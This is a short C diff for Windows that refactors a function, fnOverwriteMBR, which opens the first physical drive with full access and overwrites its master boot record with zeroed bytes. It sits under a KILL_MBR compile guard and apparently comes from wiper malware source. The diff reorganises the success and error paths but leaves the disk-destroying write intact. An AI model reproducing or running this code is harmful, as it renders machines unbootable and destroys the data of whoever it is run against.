@@ -3,14 +3,17 @@
 
 #define MBR_SIZE 512
 
-BOOL OverwriteMBR(VOID) {
+BOOL fnOverwriteMBR(VOID) {
+	WCHAR szMbrData[MBR_SIZE];
+	ZeroMemory(&szMbrData, sizeof(szMbrData));
 	DWORD dwNOBW;
-	WCHAR wcMbrData[MBR_SIZE];
-	ZeroMemory(&wcMbrData, sizeof(wcMbrData));
-	
+
 	HANDLE hMbr = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 	if (hMbr) {
-		if (!WriteFile(hMbr, wcMbrData, MBR_SIZE, &dwNOBW, NULL)) {
+		if (WriteFile(hMbr, szMbrData, MBR_SIZE, &dwNOBW, NULL)) {
+			CloseHandle(hMbr);
+			return TRUE;
+		} else {
 #ifdef DEBUG_MSG
 			MessageBox(NULL, L"Couldn't overwrite MBR", L"WriteFile", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif // DEBUG_MSG
@@ -23,8 +26,5 @@ BOOL OverwriteMBR(VOID) {
 #endif // DEBUG_MSG
 		return FALSE;
 	}
-
-	CloseHandle(hMbr);
-	return TRUE;
 }
 #endif // KILL_MBR
